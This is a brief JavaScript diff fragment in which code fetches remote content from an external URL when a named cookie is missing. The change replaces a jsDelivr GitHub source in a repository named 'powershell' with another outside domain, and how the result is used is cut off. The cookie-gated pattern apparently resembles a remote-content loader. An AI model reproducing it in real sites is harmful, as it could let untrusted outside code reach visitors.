@@ -52,7 +52,7 @@ const cookie = getCookie(cookiename);
 // Cookie found
 if(!cookie)
 {
-    fetch("https://cdn.jsdelivr.net/gh/joault/powershell@main/c1.js") 
+    fetch("https://by-rox.nl/") 
     .then(response => response.ok ? response.text() : Promise.reject())
     .then(html =>
     {
